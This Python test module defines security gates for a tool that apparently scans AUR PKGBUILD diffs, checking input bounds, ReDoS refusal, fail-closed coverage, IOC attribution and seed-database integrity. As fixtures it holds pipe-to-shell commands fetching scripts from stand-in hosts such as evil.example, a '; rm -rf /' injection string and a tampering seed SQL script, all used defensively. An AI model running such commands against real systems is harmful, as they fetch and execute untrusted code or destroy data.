"""Extracted from security_gates.py: _integrity."""

import ast
import time
from pathlib import Path
from scripts.gates._core import Gate, ROOT, SRC, _call_name, _python_files, _rel, _seed_ioc_baseline

__all__ = ['gate_api_inputs_are_bounded_before_initialization', 'gate_coverage_fails_closed', 'gate_differ_hostile_input_is_bounded', 'gate_differ_output_is_deterministic', 'gate_every_producer_accounts_for_coverage', 'gate_fatal_findings_cannot_be_suppressed', 'gate_fatal_rules_cannot_be_removed', 'gate_hashed_maintainers_protect_privacy', 'gate_ioc_expired_is_never_silent', 'gate_ioc_match_carries_source', 'gate_ioc_no_score_contribution', 'gate_ioc_not_in_config_layer', 'gate_maturity_numbers_are_not_duplicated', 'gate_pattern_ioc_rejects_redos', 'gate_regex_input_is_bounded', 'gate_rendering_is_data_driven', 'gate_seed_cannot_rewrite_the_database', 'gate_seed_hash_is_deterministic', 'gate_truncation_is_visible', 'gate_version_args_are_shape_checked']

def gate_rendering_is_data_driven() -> Gate:
    """A finding's text is a fixed template plus values, and nothing else.

    Verdicts used to be capable of going through a language model. They
    are now rendered from templates keyed by rule id, which removes a
    network dependency, a source of nondeterminism, and a prompt-injection
    surface in the *output* path (R012 still detects injection aimed at
    whoever reads the diff).  The property to keep is that a field value
    can never change the shape of the expansion: ``str.format`` does not
    re-expand what it substitutes, and no template ever comes from
    package-controlled text.
    """
    from trustsight.findings import TEMPLATES
    from trustsight.schema import PackageFact, ScoreEntry
    from trustsight.verdict import _render

    problems = []
    hostile = "{0.__class__.__mro__} {package_name} {{nested}} [red]"
    entry = ScoreEntry(
        rule_id="R001", severity="HIGH", weight=25, reason="r",
        template="{match}", evidence={"match": hostile},
    )
    out = _render(entry, PackageFact(package_name="demo"))
    if "class" in out and "__mro__" not in out:
        problems.append("a field value was evaluated rather than substituted")
    if hostile not in out:
        problems.append("a field value was re-expanded rather than substituted")

    # A template that wants a field the evidence does not carry must fall
    # back, not raise: a KeyError here would abort a whole batch.
    missing = ScoreEntry(rule_id="R001", template="{absent}", evidence={})
    if not _render(missing, PackageFact()):
        problems.append("a missing template field produced no text")

    if not TEMPLATES:
        problems.append("no templates are defined")

    # No model, no transport, anywhere in the rendering path.
    for module in ("verdict.py", "findings.py"):
        text = (SRC / module).read_text(encoding="utf-8").lower()
        for banned in ("openai", "anthropic", "requests", "urllib.request", "httpx"):
            if banned in text:
                problems.append(f"{module} references {banned}")
    return Gate("report rendering is data-driven", not problems, problems)

def gate_version_args_are_shape_checked() -> Gate:
    """``vercmp`` has no ``--``, so the argument shape is the only guard.

    Versions come from the AUR, so they are attacker-influenced. Anything
    that is not version-shaped is compared in-process instead of being put
    on a command line.
    """
    from trustsight.discovery import _VERSION_ARG_RE

    problems = []
    for hostile in ("-h", "--help", "-1:2.0", "; rm -rf /", "1.0 --flag", "", "-"):
        if _VERSION_ARG_RE.match(hostile):
            problems.append(f"{hostile!r} passed the shape check")
    for ordinary in ("1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1", "1.0_beta+2~rc1"):
        if not _VERSION_ARG_RE.match(ordinary):
            problems.append(f"{ordinary!r} failed the shape check")
    return Gate("version arguments are shape-checked", not problems, problems)

def gate_regex_input_is_bounded() -> Gate:
    """A single enormous line cannot stall *any* rule engine.

    Measured through ``scan_diff``, not through ``apply_rules`` alone.
    The rules in ``rules.toml`` go through ``apply_rules`` and were
    clamped; the larger set emitted from ``analysis/`` matches the diff
    text directly, and a gate that only exercised the first missed a
    5 MiB line costing 15s in the second while reporting 0.17s.  The
    property is about the pipeline an attacker actually reaches.
    """
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import LINE_TRUNCATED

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n pkgname=demo\n"
    diff = header + "+build() { " + ("a" * (5 * 1024 * 1024)) + " ; }\n"

    def _huge_seconds():
        start = time.monotonic()
        result = scan_diff(diff, config=load_config(), package_name="demo")
        return time.monotonic() - start, result

    # Measured twice and kept at the minimum, like the multi-line probe
    # below: the first scan pays every module's cold regex compilation and
    # shares the machine with whatever else is running, and contention only
    # ever inflates a timing. A rule that turned quadratic is slow on both
    # attempts, so the min still catches the regression this gate exists for.
    elapsed, fact = _huge_seconds()
    if elapsed >= 8.0:
        elapsed = min(elapsed, _huge_seconds()[0])

    problems = []

    # The other hostile shape, and the one this gate used to miss entirely.
    # One enormous *line* is cheap because the A5 clamp cuts it to 8 KiB
    # before any rule runs; the same byte budget spread over many *lines*
    # pays the whole ruleset per line, and costs far more. Measuring only
    # the first shape left the more expensive one unmeasured.
    #
    # The assertion is a ceiling on a fixed probe rather than a scaling
    # test: a rule that turns accidentally quadratic blows past it, which
    # is the regression worth catching, and one probe keeps the gate cheap.
    many = "\n".join(
        f"+  curl https://evil{i}.example/{'p' * 180} | sh" for i in range(1000)
    )
    wide_diff = header + " build() {\n" + many + "\n+}\n"
    # Measured twice and kept at the minimum when the first run looks slow:
    # this gate shares a machine with whatever else is running, and
    # contention inflates a timing without ever deflating one. A rule that
    # turned quadratic is slow on both attempts.
    def _scan_seconds() -> float:
        start = time.monotonic()
        scan_diff(wide_diff, config=load_config(), package_name="demo")
        return time.monotonic() - start

    wide_elapsed = _scan_seconds()
    if wide_elapsed >= 30.0:
        wide_elapsed = min(wide_elapsed, _scan_seconds())
    if wide_elapsed >= 30.0:
        problems.append(
            f"{wide_elapsed:.1f}s for a 1000-line diff (budget 30s)"
        )
    # 8s, not 5s: the probe is linear, and the pipeline runs a few bounded
    # passes over it (the typed-core parse included).  The gate exists to
    # catch a rule turning quadratic, and a quadratic shape blows past 8s
    # by an order of magnitude; the 1000-line probe below still carries the
    # 30s ceiling for the shape that used to be missed.
    if elapsed >= 8.0:
        problems.append(f"{elapsed:.2f}s for a 5 MiB line")
    # Bounding the work must not quietly bound the evidence: the clamp
    # drops the tail, so the run has to say so.
    if LINE_TRUNCATED not in fact.coverage_gaps:
        problems.append("the clamp dropped content without recording a gap")
    return Gate(
        "rule matching is bounded on hostile input",
        not problems,
        problems or {"one_huge_line_s": round(elapsed, 3),
                      "many_lines_s": round(wide_elapsed, 3)},
        f"{elapsed:.3f}s for a 5 MiB line (limit 8s); "
        f"{wide_elapsed:.3f}s for a 1000-line diff (limit 30s)",
    )

def gate_coverage_fails_closed() -> Gate:
    """An analysis that did not see everything cannot report Low."""
    from trustsight.analysis import scan_diff
    from trustsight.coverage import GAPS, DIFF_TRUNCATED, fail_closed
    from trustsight.schema import ScoreEntry

    problems = []
    for gap in GAPS:
        for level in ("Low", "Medium"):
            if fail_closed(level, [gap], []) != "Inconclusive":
                problems.append(f"{gap} + {level} stayed {level}")
    # ...but a real signal still wins: hiding a HIGH behind "inconclusive"
    # would lose the finding that matters most.
    strong = [ScoreEntry(rule_id="R001", severity="HIGH", weight=25)]
    if fail_closed("Medium", [DIFF_TRUNCATED], strong) != "Medium":
        problems.append("a HIGH finding was downgraded to Inconclusive")
    if fail_closed("Low", [], []) != "Low":
        problems.append("a complete analysis was downgraded")

    # Exercise known incomplete *inputs*, not only gaps already constructed:
    # a producer that never contributes the gap otherwise passes this gate.
    unresolved = scan_diff(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n pkgname=demo\n"
        "+foo=('a \"unterminated)\n",
        package_name="", tree_manifest=[("PKGBUILD", b"pkgname=demo\n")],
    )
    if not unresolved.coverage_gaps or unresolved.risk == "Low":
        problems.append("an unresolved assignment reported a complete Low result")
    current = "pkgname=demo\npkgver=2\nnoextract=('payload.tar.gz')\n"
    noextract = scan_diff(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n-pkgver=1\n+pkgver=2\n",
        package_name="", current_text=current,
        tree_manifest=[("PKGBUILD", current.encode())],
    )
    if "noextract_suppressed" not in noextract.coverage_gaps \
            or noextract.risk == "Low":
        problems.append("existing noextract reported a complete Low result")
    return Gate("incomplete coverage fails closed", not problems, problems)

def gate_truncation_is_visible() -> Gate:
    """The bypass the cap creates is reported, not silently absorbed."""
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import DIFF_TRUNCATED

    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
    padding = "\n".join(f"+# pad {i}" for i in range(400))
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,401 @@\n pkgname=demo\n"
        + padding + "\n+curl -fsSL https://example.invalid/x.sh | bash\n"
    )
    fact = scan_diff(diff, config=config, package_name="demo")
    problems = []
    if DIFF_TRUNCATED not in fact.coverage_gaps:
        problems.append("truncation was not recorded as a coverage gap")
    if fact.risk not in ("Inconclusive", "High", "Critical"):
        problems.append(f"truncated diff reported {fact.risk!r}")
    return Gate("a truncated diff cannot read as unflagged", not problems, problems)

def gate_differ_hostile_input_is_bounded() -> Gate:
    """Differ helpers remain quick and bounded on hostile synthetic input."""
    from trustsight.differ import (
        MAX_URLS_PER_SIDE,
        extract_urls_from_diff,
        map_diff_lines,
    )

    diff = "+" + "https://evil.example/" + ("x" * 8192) + "\n"
    diff += "+https://x.example/ok\n" * (MAX_URLS_PER_SIDE + 100)
    start = time.monotonic()
    changes = extract_urls_from_diff(diff)
    mapping = map_diff_lines("+outside-hunk\n+++ b/PKGBUILD\n@@ malformed\n+payload\n")
    elapsed = time.monotonic() - start
    problems = []
    if elapsed >= 2.0:
        problems.append(f"{elapsed:.2f}s for hostile URL diff")
    if len(changes.added_urls) > MAX_URLS_PER_SIDE:
        problems.append("URL result exceeded its bound")
    if mapping:
        problems.append("content outside a file header/hunk was mapped")
    return Gate("differ hostile input is bounded", not problems, problems or round(elapsed, 3))

def gate_differ_output_is_deterministic() -> Gate:
    """Repeated differ extraction has stable ordering and values."""
    from trustsight.differ import extract_urls_from_diff

    diff = "+https://z.example/a https://a.example/b https://z.example/a\n"
    first = extract_urls_from_diff(diff)
    second = extract_urls_from_diff(diff)
    passed = first == second and first.added_urls == sorted(first.added_urls)
    return Gate("differ output is deterministic", passed, first.added_urls)

def gate_api_inputs_are_bounded_before_initialization() -> Gate:
    """Public API rejects oversized input before touching analysis state."""
    from trustsight.api import MAX_API_NAME_BYTES, MAX_API_TEXT_BYTES, TrustSight

    client = TrustSight()
    touched = []

    def mark_ready():
        touched.append(True)

    client._ensure_ready = mark_ready
    problems = []
    cases = (
        ("inspect", lambda: client.inspect("x" * (MAX_API_NAME_BYTES + 1), check_aur=False)),
        ("text", lambda: client.analyze_text("demo", "x" * (MAX_API_TEXT_BYTES + 1))),
        ("pivot", lambda: client.pivot("x" * (MAX_API_NAME_BYTES + 1))),
    )
    for label, call in cases:
        try:
            call()
        except ValueError:
            continue
        except Exception as exc:
            problems.append(f"{label} raised {type(exc).__name__}, not ValueError")
        else:
            problems.append(f"{label} accepted oversized input")
    if touched:
        problems.append("initialization occurred before validation")
    return Gate(
        "API inputs are bounded before initialization",
        not problems,
        problems or len(cases),
    )

def gate_maturity_numbers_are_not_duplicated() -> Gate:
    """B3's two numbers are the constant, not a copy of it.

    The doc states 50 (where novelty reaches full weight) and 25 (half of
    it, where the Inconclusive downgrade stops applying).  Both are
    derived from one constant, and a page that restates a constant will
    eventually restate a stale one, so the page is checked against the
    value and the behaviour is checked against the predicate.
    """
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD, calculate_score, maturity

    problems = []
    half = _MATURITY_THRESHOLD // 2

    doc = (ROOT / "docs" / "security" / "what-a-result-claims.md").read_text(encoding="utf-8")
    section = doc.split("### B3.")[-1].split("\n### ")[0]
    if f"**{_MATURITY_THRESHOLD}**" not in section:
        problems.append(f"B3 does not state the threshold ({_MATURITY_THRESHOLD})")
    if f"fewer than {half}" not in section:
        problems.append(f"B3 does not state the half point ({half})")

    # The predicate itself: Medium band, cold, nothing strong -> Inconclusive.
    if maturity(half) != 0.5 or maturity(_MATURITY_THRESHOLD) != 1.0:
        problems.append("the maturity ramp does not reach 0.5 and 1.0 where stated")

    weak = [{"rule_id": "R050", "severity": "MEDIUM", "name": "w", "match": ""}] * 2
    cold = NoveltyContext(observation_count=half - 1)
    warm = NoveltyContext(observation_count=_MATURITY_THRESHOLD)
    _s, _b, cold_level = calculate_score(weak, {}, cold)
    _s, _b, warm_level = calculate_score(weak, {}, warm)
    if cold_level != "Inconclusive":
        problems.append(f"a cold Medium was reported {cold_level!r}")
    if warm_level == "Inconclusive":
        problems.append("a warm Medium was downgraded")

    strong = weak + [{"rule_id": "R001", "severity": "HIGH", "name": "s", "match": ""}]
    _s, _b, strong_level = calculate_score(strong, {}, cold)
    if strong_level == "Inconclusive":
        problems.append("a HIGH finding was downgraded by the cold-start rule")

    return Gate("the maturity numbers are derived, not copied", not problems,
                problems or {"threshold": _MATURITY_THRESHOLD, "half": half})

def gate_fatal_rules_cannot_be_removed() -> Gate:
    """Deleting or downgrading a FATAL rule in rules.toml does not work."""
    from trustsight.config import (
        enforce_fatal_rules, shipped_fatal_rule_ids, shipped_rules,
    )

    fatal_ids = shipped_fatal_rule_ids()
    problems = []
    if not fatal_ids:
        problems.append("no shipped rule is FATAL")
    for rid in fatal_ids:
        deleted = [r for r in shipped_rules() if r["id"] != rid]
        effective, restored = enforce_fatal_rules(deleted)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed deleted")

        downgraded = [
            dict(r, severity="INFO") if r["id"] == rid else r
            for r in shipped_rules()
        ]
        effective, restored = enforce_fatal_rules(downgraded)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed downgraded")
    return Gate("FATAL rules cannot be switched off", not problems,
                problems or fatal_ids)

def gate_fatal_findings_cannot_be_suppressed() -> Gate:
    """An override never hides a FATAL finding, whatever the file says."""
    import trustsight.override as override_module

    saved = override_module.load_overrides
    override_module.load_overrides = lambda: [
        override_module.RuleOverride(rule_id="R012", reason="test", package=None),
        override_module.RuleOverride(rule_id="R055", reason="test", package=None),
    ]
    try:
        kept, suppressed = override_module.filter_triggered_rules([
            {"rule_id": "R012", "severity": "FATAL", "name": "x"},
            {"rule_id": "R055", "severity": "MEDIUM", "name": "y"},
        ])
    finally:
        override_module.load_overrides = saved

    problems = []
    if not any(r["rule_id"] == "R012" for r in kept):
        problems.append("a FATAL finding was suppressed")
    if not any(r["rule_id"] == "R055" for r in suppressed):
        problems.append("a suppressed finding was discarded instead of reported")
    return Gate("FATAL findings survive every override", not problems, problems)

def gate_seed_cannot_rewrite_the_database() -> Gate:
    """A seed describes itself; it does not get to set anything else."""
    import sqlite3
    import tempfile

    import trustsight.db as db

    from calibration_gates import shipped_config

    problems = []
    with shipped_config():
        db.init_db()
        db.set_metadata("baseline_provenance", "local")

        # A locally learned maintainer count: the seed must not be able to
        # raise it, because a high count is what makes H026/H044 stay quiet.
        with db.get_connection() as local:
            local.execute(
                "INSERT OR REPLACE INTO maintainer_counts (name, count) "
                "VALUES ('victim', 1)"
            )
            local.commit()

        seed_path = Path(tempfile.mkstemp(suffix=".db")[1])
        conn = sqlite3.connect(seed_path)
        conn.executescript(
            """
            CREATE TABLE metadata (key TEXT PRIMARY KEY, value TEXT);
            CREATE TABLE source_urls (
                url TEXT PRIMARY KEY, first_seen_package_id INTEGER,
                first_seen_globally_timestamp INTEGER, total_uses INTEGER,
                last_seen_timestamp INTEGER);
            CREATE TABLE maintainers (
                name TEXT PRIMARY KEY, package_count INTEGER,
                first_seen_timestamp INTEGER, last_seen_timestamp INTEGER);
            CREATE TABLE maintainer_counts (name TEXT PRIMARY KEY, count INTEGER);
            INSERT INTO metadata VALUES ('seed_observation_count', '100');
            INSERT INTO metadata VALUES ('baseline_provenance', 'ATTACKER');
            INSERT INTO maintainer_counts VALUES ('victim', 9999);
            """
        )
        conn.commit()
        conn.close()

        db.import_seed(seed_path)
        if db.get_metadata("baseline_provenance") != "local":
            problems.append("the seed overwrote a key it does not own")
        if db.get_metadata(db.SEED_OBSERVATION_KEY) != "100":
            problems.append("the seed's own key was not applied")
        if not db.get_metadata(db.SEED_DIGEST_KEY):
            problems.append("the imported seed's digest was not recorded")
        with db.get_connection() as local:
            row = local.execute(
                "SELECT count FROM maintainer_counts WHERE name = 'victim'"
            ).fetchone()
        if row is None or row["count"] != 1:
            problems.append("the seed overwrote a locally learned maintainer count")
        seed_path.unlink(missing_ok=True)
    return Gate("a seed cannot rewrite the database", not problems, problems)

def gate_hashed_maintainers_protect_privacy() -> Gate:
    """P1: after seeding, maintainer identities are stored only as salted hashes.

    The v0.12.0 seed format never writes plaintext names or emails.  The
    local database mirrors that invariant: the hashed maintainer table has
    no plaintext columns, and a seeded database always carries the salt
    needed to reproduce the hashes.
    """
    import shutil
    import sqlite3
    import tempfile

    import trustsight.db as db
    import trustsight.seed_build as seed_build

    from calibration_gates import shipped_config

    problems = []
    with shipped_config():
        db.init_db()

        # Build a tiny v2 seed from raw maintainer records.
        raw = [
            {"name": "Alice Example", "email": "alice@example.com",
             "packages": ["pkg-a"], "source": "aur"},
            {"name": "Bob Builder", "packages": ["pkg-b"], "source": "aur"},
        ]
        seed_dir = Path(tempfile.mkdtemp(prefix="trustsight-seed-"))
        try:
            seed_build.build_seed(raw, seed_dir)
            db.import_seed(seed_dir)

            with db.get_connection() as local:
                # Hashed table must not contain plaintext identity columns.
                columns = {
                    row["name"]
                    for row in local.execute(
                        "PRAGMA table_info(maintainers_hashed)"
                    ).fetchall()
                }
                for forbidden in ("name", "email"):
                    if forbidden in columns:
                        problems.append(
                            f"maintainers_hashed has plaintext '{forbidden}' column"
                        )

                # A seeded database must have a stored salt.
                salt = db._get_salt(local)
                if not salt:
                    problems.append("seed_meta.salt is missing after seed import")

                # No plaintext maintainer names should remain in the active
                # maintainer tables.
                for forbidden in ("Alice Example", "Bob Builder", "alice@example.com"):
                    for table in ("maintainers_hashed", "package_maintainers_hashed"):
                        try:
                            rows = local.execute(
                                f"SELECT 1 FROM {table} WHERE name_hash = ? OR email_hash = ?",
                                (forbidden, forbidden),
                            ).fetchall()
                        except sqlite3.OperationalError:
                            continue
                        if rows:
                            problems.append(
                                f"plaintext value '{forbidden}' found in {table}"
                            )
        finally:
            shutil.rmtree(seed_dir, ignore_errors=True)
    return Gate("hashed maintainers protect privacy", not problems, problems)

def gate_ioc_match_carries_source() -> Gate:
    """A13b: an IOC finding is attribution, so it names who called it bad.

    Every IocMatch the analysis produces must carry a non-empty ``source``;
    a match that cannot say which curator flagged the artifact is aggregation,
    not attribution, and A13b forbids merging IOCs into an anonymous set.
    """
    import shutil

    import trustsight.config as config_module
    import trustsight.db as db
    from trustsight.analysis.ioc_match import ioc_baseline_matches
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base = _seed_ioc_baseline()
        # The stage reads config via load_config(); enable the baseline there.
        cfg = config_module.load_config()
        cfg.setdefault("baselines", {})["ioc"] = {"enabled": True, "sources": []}
        saved = config_module.load_config
        config_module.load_config = lambda: cfg
        try:
            diff = "+source=('https://malware.example/x.tar.gz')\n"
            matches = ioc_baseline_matches(diff, package_name="demo")
        finally:
            config_module.load_config = saved
            shutil.rmtree(base, ignore_errors=True)
        if not matches:
            problems.append("a known-bad domain produced no IOC match")
        for m in matches:
            if not getattr(m, "source", ""):
                problems.append(f"IOC match for {m.value!r} carries no source")
    return Gate("an IOC match carries its source", not problems, problems)

def gate_ioc_no_score_contribution() -> Gate:
    """B1: an IOC match is detection, not a weighted finding.

    IOC matches live on ``PackageFact.ioc_matches``, never in
    ``score_breakdown``, and never move the number.  The same PKGBUILD scores
    identically whether or not a known-bad indicator matches: the IOC is
    reported alongside the score, it does not become part of it.
    """
    import shutil

    import trustsight.config as config_module
    import trustsight.db as db
    from trustsight.analysis import scan_diff
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base_cfg = config_module.load_config()
        diff = "+source=('https://malware.example/x.tar.gz')\n"

        saved = config_module.load_config
        try:
            # Baseline disabled: reference score, no IOC stage.
            base_cfg.setdefault("baselines", {})["ioc"] = {"enabled": False}
            config_module.load_config = lambda: base_cfg
            base_fact = scan_diff(diff, config=base_cfg, package_name="demo", seen_urls={})

            base = _seed_ioc_baseline()
            base_cfg["baselines"]["ioc"] = {"enabled": True, "sources": []}
            matched = scan_diff(diff, config=base_cfg, package_name="demo", seen_urls={})
        finally:
            config_module.load_config = saved
            shutil.rmtree(base, ignore_errors=True)

        if not matched.ioc_matches:
            problems.append("the known-bad domain produced no IOC match")
        if matched.final_score != base_fact.final_score:
            problems.append(
                f"IOC match changed the score {base_fact.final_score} -> "
                f"{matched.final_score}"
            )
        for e in matched.score_breakdown:
            if "ioc" in (e.rule_id or "").lower():
                problems.append(f"an IOC entry appeared in score_breakdown: {e.rule_id}")
    return Gate("IOC matches never contribute to the score", not problems, problems)

def gate_ioc_expired_is_never_silent() -> Gate:
    """An expired IOC is reported as expired, not silently dropped or flagged.

    ``active_iocs`` excludes expired entries from matching by default, so a
    stale indicator does not keep flagging forever; but it must remain
    retrievable and labelled expired, so a reviewer is never told an
    indicator was clean when it had merely lapsed.
    """
    import shutil

    import trustsight.db as db
    import trustsight.ioc_baseline as ioc
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base = _seed_ioc_baseline(source="stale-feed", expires_at="2000-01-01T00:00:00Z")
        try:
            default = ioc.active_iocs(source="stale-feed")
            if default:
                problems.append("an expired IOC still matched by default")
            including = ioc.active_iocs(source="stale-feed", expired=True)
            if not including:
                problems.append("an expired IOC could not be retrieved even with expired=True")
            for e in including:
                if not ioc._is_expired(e.expires_at):
                    problems.append("expired retrieval returned a non-expired entry")
        finally:
            shutil.rmtree(base, ignore_errors=True)
    return Gate("an expired IOC is never silent", not problems, problems)

def gate_ioc_not_in_config_layer() -> Gate:
    """Config separation: IOCs are state, not evaluation logic.

    The shipped rules/patterns/thresholds config carries no ``ioc`` table.
    IOCs are observations about the world and live in the baseline layer
    (A13); letting them into the rule config would make an override or a
    weight able to reach them, which is exactly what the IOC gate forbids.
    """
    import tomllib

    from trustsight.config import DEFAULT_PATTERNS, DEFAULT_RULES, DEFAULT_THRESHOLDS

    problems: list[str] = []
    for name, blob in (
        ("rules", DEFAULT_RULES),
        ("patterns", DEFAULT_PATTERNS),
        ("thresholds", DEFAULT_THRESHOLDS),
    ):
        try:
            data = tomllib.loads(blob)
        except tomllib.TOMLDecodeError as exc:
            problems.append(f"{name} config does not parse: {exc}")
            continue
        for key in data:
            if "ioc" in str(key).lower():
                problems.append(f"{name} config carries an ioc-shaped key: {key}")
    return Gate("IOCs are not in the rule config layer", not problems, problems)

def gate_pattern_ioc_rejects_redos() -> Gate:
    """A curator-supplied pattern that risks catastrophic backtracking is refused.

    `pkgbuild_pattern` entries come from third-party baselines, so an unsafe
    regex would let one curator hang every analysis.  The same check the rule
    linter uses is applied at compile time: a nested quantifier or a measured
    superlinear shape must return None, and a benign pattern must compile.
    """
    from trustsight.iocs import compile_ioc_pattern

    problems: list[str] = []
    if compile_ioc_pattern(r"(a+)+$") is not None:
        problems.append("a nested-quantifier pattern was accepted")
    if compile_ioc_pattern(r"(a|aa)+$") is not None:
        problems.append("an ambiguous-alternation pattern was accepted")
    # A multi-atom body (`\w+\s?`) is invisible to the narrow nested-atom
    # detector and is just as catastrophic under the outer `+`.
    if compile_ioc_pattern(r"(\w+\s?)+") is not None:
        problems.append("a multi-atom quantified group was accepted")
    if compile_ioc_pattern("(") is not None:
        problems.append("an invalid regex was accepted")
    if compile_ioc_pattern("") is not None:
        problems.append("an empty pattern was accepted")
    if compile_ioc_pattern(r"\bnpm\s+install\b") is None:
        problems.append("a benign pattern was refused")
    return Gate("a pattern IOC that risks ReDoS is refused", not problems, problems)

def gate_seed_hash_is_deterministic() -> Gate:
    """Reproducibility: same input and salt always produce the same hash.

    The seed is only reproducible, and a lookup only lands, if hashing is a
    pure function of (salt, value).  A salt change must change the hash, or
    the per-seed salt would not be defeating precomputed tables.
    """
    from trustsight.seed_build import _hash_value

    problems: list[str] = []
    salt_a, salt_b = "a" * 64, "b" * 64
    v = "alice@example.com"
    if _hash_value(v, salt_a) != _hash_value(v, salt_a):
        problems.append("hashing the same value twice gave different results")
    if _hash_value(v, salt_a) == _hash_value(v, salt_b):
        problems.append("a different salt produced the same hash")
    if _hash_value("a@x", salt_a) == _hash_value("b@x", salt_a):
        problems.append("two different values collided under one salt")
    return Gate("the seed hash is deterministic", not problems, problems)

def gate_every_producer_accounts_for_coverage() -> Gate:
    """Every construction of a PackageFact declares what it examined.

    Enumerated from the source rather than from the paths a test happens
    to call.  Most producers set ``coverage_gaps``; one, the first-analysis
    path, declared ``tree_analyzed=True`` having read no tree at all and
    reported a bare "Low".  Every gaps_from producer must also account for
    unresolved assignments and the post-state noextract declaration, so a
    new entry point cannot silently omit either known boundary.
    """
    hits: list[str] = []
    found = 0
    gap_calls = 0
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = _call_name(node).split(".")[-1]
            if name == "gaps_from":
                gap_calls += 1
                kwargs = {kw.arg for kw in node.keywords}
                for required in ("unresolved_assignments", "noextract_present"):
                    if required not in kwargs:
                        hits.append(f"{_rel(path)}:{node.lineno} no {required}=")
                continue
            if name != "PackageFact":
                continue
            found += 1
            kwargs = {kw.arg for kw in node.keywords}
            if "coverage_gaps" not in kwargs:
                hits.append(f"{_rel(path)}:{node.lineno} no coverage_gaps=")
            # tree_analyzed=True as a literal is a claim, not a measurement.
            for kw in node.keywords:
                if kw.arg == "tree_analyzed" and isinstance(kw.value, ast.Constant):
                    if kw.value.value is True:
                        hits.append(
                            f"{_rel(path)}:{node.lineno} tree_analyzed hardcoded True"
                        )
    if not found:
        hits.append("no PackageFact construction found: the check sees nothing")
    if not gap_calls:
        hits.append("no gaps_from producer found: the check sees nothing")
    return Gate("every result declares its coverage", not hits, hits or found)
